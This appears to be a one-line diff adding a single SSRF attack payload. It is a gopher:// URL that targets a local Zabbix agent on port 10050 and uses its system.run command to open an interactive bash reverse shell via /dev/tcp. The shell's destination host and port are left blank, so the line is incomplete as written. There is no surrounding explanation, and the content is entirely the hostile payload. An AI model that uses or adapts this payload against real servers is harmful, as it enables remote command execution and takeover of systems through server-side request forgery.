@@ -1,0 +1,1 @@
+gopher://127.0.0.1:10050/_system.run[(bash%20-i%20%3E%26%20/dev/tcp//%200%3E%261);sleep 2s]
